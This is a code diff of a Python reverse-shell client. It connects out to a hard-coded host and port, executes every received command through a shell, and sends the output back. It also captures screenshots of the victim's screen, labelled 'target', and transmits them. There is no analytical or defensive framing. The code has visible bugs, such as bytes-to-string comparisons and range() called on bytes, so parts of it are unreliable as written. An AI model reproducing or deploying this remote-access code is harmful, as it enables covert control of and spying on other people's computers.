@@ -1,33 +1,38 @@
-'''cheking the moduels'''
+'''importing modules'''
+import sys , os ,time
 try:
+    import subprocess
     import pyautogui
     import tqdm
-    import subprocess
 except:
+    os.system("pip install subprocess > install.txt")
     os.system("pip install pyautogui > install.txt")
-    os.system("pip3 install tqdm > install.txt")
+    os.system("pip install tqdm > install.txt")
     os.system("rm install.txt")
-    import pyautogui
-    import tqdm
-    import subprocess
-
-import os , sys , time, socket
-'''setting variables'''
+'''seting variables'''
+import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = "192.168.1.110"
 port = 5050
 SEPARATOR = "<SEPARATOR>"
-'''creaing connetcion'''
-def connection():
-    try:
-        s.connect((host ,port))
-    except:
-        return connection()
-'''creating class'''
-class reverse_shell:
-    def screenshot():
-        for i in range(data[2:].encode("utf-8")):
-            screenshot = pyautogui.screenshot()
-            img = screenshot.save(f"target{i}.png")
-            img_size = os.path.getsize(img)
-            s.send(f"{img}{SEPARATOR}{img_size}".encode("utf-8")
+'''starting connecting to the server'''
+s.connect((host ,port))
+
+'''reciving commands and sending'''
+def recv_cammand():
+    while True:
+        data = s.recv(1024)
+        if data[0:] == "cd":
+            os.chdir(data[2:].encode("utf-8"))
+        elif data == "screenshot":
+            for i in range(data[2:].encode("utf-8")):
+                screenshot = pyautogui.screenshot()
+                img = screenshot.save(f"target{i}.png")
+                img_size = os.path.getsize(img)
+                s.send(f"{img}{SEPARATOR}{img_size}".encode("utf-8"))
+        if len(data) > 0:
+            terminal = subprocess.Popen(data[:].encode("utf-8"), shell=True, stdout=subprocess.PIPE ,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+            output_bite = terminal.stdout.read() + terminal.stderr.read()
+            output_str = str(output_bite,"utf-8")
+            s.send(str.encode(output_str))
+    s.close()
